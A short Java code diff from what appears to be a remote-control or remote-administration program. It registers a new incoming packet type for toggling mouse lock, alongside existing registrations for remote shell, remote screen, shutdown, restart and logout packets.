@@ -32,7 +32,7 @@ public abstract class AbstractIncomingPacket {
 		PACKETS_INCOMING.put((short) 24, Packet24RemoteShellStop.class);
 		PACKETS_INCOMING.put((short) 25, Packet25RemoteShellExecute.class);
 		PACKETS_INCOMING.put((short) 26, Packet26StopRemoteScreen.class);
-		// 27
+		PACKETS_INCOMING.put((short) 27, Packet27ToggleMouseLock.class);
 		PACKETS_INCOMING.put((short) 28, Packet28ShutdownComputer.class);
 		PACKETS_INCOMING.put((short) 29, Packet29RestartComputer.class);
 		PACKETS_INCOMING.put((short) 30, Packet30LogoutComputer.class);
